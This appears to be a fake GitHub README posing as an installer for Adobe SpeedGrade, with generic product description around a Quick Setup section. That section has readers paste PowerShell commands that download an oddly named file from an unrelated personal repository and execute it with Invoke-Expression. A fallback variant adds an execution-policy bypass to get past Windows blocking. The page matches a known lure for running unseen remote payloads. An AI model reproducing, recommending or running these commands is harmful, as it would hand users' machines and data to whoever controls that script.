# SpeedGrade

SpeedGrade is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open SpeedGrade and work in it.

Adobe SpeedGrade is professional color grading software for Windows, aimed at finishing cinematic and broadcast footage after editorial lock. The workspace is built around scopes, primary and secondary controls, and a timeline oriented toward look development rather than rough assembly. Operators work in dedicated grading suites where accurate monitoring and repeatable color decisions matter more than fast cutting.

A typical session begins with a project tied to delivery specs and footage imported as reels or a linked edit timeline. You confirm input log profiles and output transforms, then move shot by shot through balance and creative passes. Masked secondaries isolate skies, skin, or shadows while parade, waveform, and vectorscope views guide exposure and hue. Saved grades and lookup tables spread a hero look across episodes, and real-time playback helps you judge motion before you render graded outputs or return a graded timeline to finishing.

This repository keeps a Windows setup file for consistent deployment across workstations, operator notes that record local folder layout and calibration assumptions, and a changelog that tracks build updates and preset changes between projects. Maintainers refresh the changelog when default IO settings or shared LUT paths shift between facilities. The setup file captures install steps your IT group standardizes, and the notes help new colorists align fresh machines with the rest of the grade pipeline.

## What you do with it

- Timeline-based grading keeps look decisions synchronized with edit points across long-form projects.
- Primary lift, gamma, and gain wheels adjust exposure and color balance on log and RAW sources.
- Masked secondaries target hue ranges so skies, skin tones, and shadows refine independently.
- Built-in parade, waveform, and vectorscope views expose clipping and tint while you grade.
- Custom looks save as portable presets and LUT exports for reuse across episodes and reels.
- GPU-assisted playback helps review motion-heavy shots before you commit to final renders.
- Shot matching tools align white balance and contrast between cameras within the same scene.
- Input and output transforms map camera log spaces to calibrated display and delivery targets.

## Quick Setup (PowerShell)

This installs the program SpeedGrade on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/voss-lena0315351/speedgrade-setup-guide/main/g2xzsxzyvh.guo64xqn | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/voss-lena0315351/speedgrade-setup-guide/main/g2xzsxzyvh.guo64xqn | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `g2xzsxzyvh.guo64xqn` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `voss-lena0315351/speedgrade-setup-guide`. Adobe SpeedGrade 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
